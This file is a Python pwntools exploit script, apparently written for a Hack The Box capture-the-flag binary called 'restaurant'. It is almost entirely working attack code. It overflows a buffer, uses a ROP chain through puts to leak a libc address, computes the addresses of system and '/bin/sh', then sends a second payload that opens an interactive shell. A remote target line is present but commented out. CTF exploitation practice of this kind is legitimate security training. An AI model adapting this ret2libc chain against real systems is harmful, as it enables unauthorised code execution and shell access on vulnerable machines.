from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./restaurant")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/red_team/htb/resturaunt/pwn_restaurant/libc.so.6"}


p = process("./restaurant")

#p = remote("206.189.125.80", 30246)

# breakpoint *fill+162 breaks the leak, why?
#p = gdb.debug("./restaurant", '''
#break *main
#''')

pop_rdi = 0x4010a3 # pop rdi; ret
pop_rsi = 0x4010a1 # pop rsi; pop r15; ret
ret = 0x40063e # for payload
main = 0x400f68

#puts_got = elf.got["puts"] # got entry for puts()
#puts_plt = elf.plt["puts"] # puts() from binary
puts_got = 0x601fa8
puts_plt = 0x400650



payload = ""
payload += "A" * 40
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendline("1")
p.recv()

p.sendline(payload)
time.sleep(1)
leak = p.recv()
l = leak.find("\xa3\x10\x40") + 3 

#libc_puts = int(p.recv(8)[::-1].encode('hex'),16)

libc_puts = u64(leak[l:l+6].ljust(8,"\x00"))
libc_main = libc_puts - 389008
libc_system = libc_main + 186944
libc_binsh = libc_main + 1647370

print "libc puts: ", hex(libc_puts)
print "libc main : ", hex(libc_main)
print "libc system: ", hex(libc_system)
print "libc /bin/sh: ", hex(libc_binsh)

p.sendline("1")
p.recv()

payload2 = ""
payload2 += "A" * 40
payload2 += p64(pop_rdi)
payload2 += p64(libc_binsh)
payload2 += p64(ret)        # ret; if missing or "JUNKJUNK" it fails 
payload2 += p64(libc_system)

p.sendline(payload2)
p.interactive()
